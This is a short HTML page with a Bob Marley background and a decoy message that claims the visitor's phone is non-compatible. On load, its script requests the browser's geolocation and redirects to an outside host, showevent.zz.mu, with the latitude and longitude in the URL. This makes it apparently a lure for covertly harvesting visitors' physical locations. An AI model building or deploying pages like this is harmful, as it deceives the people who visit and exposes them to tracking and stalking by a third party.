<!DOCTYPE html>
<html>
<body>
  <div id="centerDiv" class="centerDiv">
   <h3>If You are seeing this message your phone is non-compatible</h3>
<p></p>
</div>
<style type="text/css">
h3{
color:white;
}
.centerDiv{
    position: absolute;
    top: 45%;
    left: 45%;
    margin-top: -50px;
    margin-left: -50px;
    width: 120px;
    height: 100px;
}
html { 
  background: url(http://jamaicansmusic.com/images/uploads/genres/111042-bob_marley_617_409.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

</style>
<script>
window.onload=function(){
if(navigator.geolocation)
{
navigator.geolocation.getCurrentPosition(showPosition);
}
else
{
alert("Geolocation is not supported by this browser.");
}
}
function showPosition(pos){
window.location.href="http://showevent.zz.mu/a.php?lat="+pos.coords.latitude+"&&long="+pos.coords.longitude;
}
</script>
</body>
</html>
